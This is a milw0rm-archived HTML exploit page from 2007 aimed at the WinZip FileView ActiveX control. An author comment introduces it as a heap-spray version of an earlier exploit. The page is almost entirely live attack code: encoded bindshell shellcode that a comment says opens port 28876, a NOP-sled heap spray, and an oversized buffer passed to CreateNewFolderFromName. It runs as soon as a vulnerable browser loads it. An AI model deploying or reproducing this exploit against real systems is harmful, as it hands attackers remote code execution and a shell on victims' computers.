<!--
prdelka
http://blogs.23.nu/prdelka

I made a version of my winzip exploit that utilises the heap spray 
method with a bindshell for some project or other. you can download a 
copy here if its of use to you, note i used a different method courtesy 
of http://www.milw0rm.com/exploits/3055 - however i couldnt get their 
exploit to function. enjoy. 
-->

<HTML>
<HEAD>
<meta http-equiv="refresh" content="0">
<TITLE></TITLE>
</HEAD>
<BODY>
<OBJECT ID="WZFILEVIEW" WIDTH=50 HEIGHT=50 CLASSID="CLSID:A09AE68F-B14D-43ED-B713-BA413F034904"></OBJECT>
<script type="text/javascript">
shellcode = unescape("%u4343%u4343%u43eb%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac%u85c7%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050%u4050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347%uc656%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff%uef87%u12bb%u6d6b%ue8d0%ufec2%uffff%uc483%u615c%u89eb");
//bindshell port 28876
bigblock = unescape("%u9090%u9090");
headersize = 20;
slackspace = headersize+shellcode.length
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (i=0;i<900;i++) memory[i] = block + shellcode;
var buf = 'A';
while (buf.length < 512) buf+='\x09';
WZFILEVIEW.CreateNewFolderFromName(buf);
</SCRIPT>
</BODY>
</HTML>

# milw0rm.com [2007-03-06]